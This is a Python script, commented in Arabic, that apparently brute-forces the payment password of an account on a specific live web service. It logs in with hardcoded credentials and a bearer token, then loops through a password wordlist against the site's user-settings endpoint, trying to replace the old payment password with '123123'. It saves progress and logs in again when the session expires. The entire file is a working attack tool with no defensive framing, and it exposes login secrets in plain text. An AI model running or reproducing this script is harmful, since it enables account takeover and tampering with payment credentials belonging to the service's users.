import requests
import threading
import time
import json

# بيانات تسجيل الدخول
login_data = {
    'username': '1281811280',
    'password': '123456',
    'lang': 'eg',
}

# التوكن المستخدم في الطلبات
token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"

# رأس الطلبات (Headers)
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'PythonRequests',
    'Authorization': f'Bearer {token}',
}

# متغيرات التقدم
progress_file = 'progress.json'
is_running = True
progress = 0

# تحميل التقدم المحفوظ من ملف
def load_progress():
    try:
        with open(progress_file, 'r') as f:
            data = json.load(f)
            print(f"✅ تم استعادة التقدم من {progress_file}: {data['progress']}")
            return data['progress']
    except (FileNotFoundError, json.JSONDecodeError):
        print("⚠️ لا يوجد تقدم محفوظ، البدء من الصفر.")
        return 0

# حفظ التقدم في ملف
def save_progress(progress):
    with open(progress_file, 'w') as f:
        json.dump({'progress': progress}, f)
    print(f"💾 تم حفظ التقدم الحالي: {progress}")

# قراءة كلمات المرور من ملف
def load_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            passwords = file.read().splitlines()
            print(f"✅ تم تحميل {len(passwords)} كلمة مرور من {file_path}")
        return passwords
    except FileNotFoundError:
        print(f"⚠️ الملف {file_path} غير موجود.")
        return []

# دالة للتحقق من الاتصال بالإنترنت
def check_internet():
    url = "http://www.google.com"
    timeout = 5
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        return False

# دالة إعادة تسجيل الدخول
def relogin():
    global token, headers
    print("🔄 إعادة تسجيل الدخول للحصول على توكن جديد...")
    try:
        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', json=login_data)
        if response.status_code == 200:
            result = response.json()
            if "info" in result and "token" in result["info"]:
                token = result["info"]["token"]
                headers['Authorization'] = f'Bearer {token}'  # تحديث التوكن في الهيدر
                print(f"✅ تم الحصول على التوكن الجديد: {token}")
        else:
            print(f"⚠️ فشل تسجيل الدخول. الرد: {response.json()}")
    except requests.exceptions.RequestException as e:
        print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
        time.sleep(5)

# دالة تجربة كلمات المرور
def try_passwords(passwords):
    global progress, is_running, token, headers

    if not passwords:
        print("⚠️ لا توجد كلمات مرور للتجربة.")
        return

    while is_running and progress < len(passwords):
        # تحقق من الاتصال بالإنترنت قبل المحاولة
        if not check_internet():
            print("⚠️ الإنترنت غير متصل. الانتظار حتى يعود الاتصال...")
            while not check_internet():
                time.sleep(5)  # انتظر 5 ثواني قبل إعادة المحاولة
            print("✅ الاتصال بالإنترنت تم استعادته.")

        password = passwords[progress]  # كلمة المرور التالية من الملف
        print(f"🔑 تجربة كلمة المرور رقم {progress + 1}: {password}")
        data = {
            'o_payword': password,
            'n_payword': '123123',
            'r_payword': '123123',
            'lang': 'eg',
            'token': token,
        }
        url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
        try:
            response = requests.post(url, json=data, headers=headers)
            response_json = response.json()

            # التحقق من نتيجة الطلب
            if response_json.get("code") == 200:
                print(f"✅ تم تغيير كلمة المرور بنجاح باستخدام: {password}")
            elif response_json.get("code") in [203, 204]:
                print("🔄 انتهت الجلسة، إعادة تسجيل الدخول...")
                relogin()  # إعادة تسجيل الدخول والحصول على توكن جديد
            else:
                print(f"⚠️ فشل تغيير كلمة المرور. الرد: {response_json}")

            progress += 1  # تحديث التقدم
            save_progress(progress)  # حفظ التقدم الحالي

        except requests.exceptions.RequestException as e:
            print(f"⚠️ خطأ أثناء إرسال الطلب: {e}")
            time.sleep(5)

# تحميل كلمات المرور من الملف
passwords = load_passwords('passwordss.txt')

# تحميل التقدم المحفوظ أو البدء من الصفر
progress = load_progress()

# بدء تجربة كلمات المرور في Thread منفصل
if passwords:
    threading.Thread(target=try_passwords, args=(passwords,), daemon=True).start()
    while progress < len(passwords):
        print(f"🔄 التقدم الحالي: {progress}/{len(passwords)} كلمات مرور تم تجربتها.")
        time.sleep(5)  # تحديث التقدم كل 5 ثواني
else:
    print("⚠️ لم يتم العثور على كلمات مرور لتجربتها.")
    
    time.sleep(2)
